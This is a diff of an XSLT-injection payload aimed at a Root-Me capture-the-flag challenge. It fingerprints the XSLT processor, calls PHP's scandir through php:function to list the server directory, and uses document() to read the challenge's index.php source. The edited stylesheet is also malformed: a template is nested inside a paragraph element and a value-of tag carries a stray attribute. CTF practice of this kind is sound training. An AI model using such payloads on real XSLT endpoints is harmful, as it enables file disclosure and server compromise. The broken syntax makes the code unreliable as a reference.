@@ -4,11 +4,14 @@
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
     	Version: <xsl:value-of select="system-property('xsl:version')" />
+        
     	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+        
     	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
-    	<xsl:variable name="assert" select="php:function('scandir', '.')"/>
-        Dir: <xsl:value-of name="assert"select="exsl:node-set($assert)/Item[1]"/>
-
+        
+        <xsl:template match="/">
+            Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+        </xsl:template>
         
     	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>    
     </p>
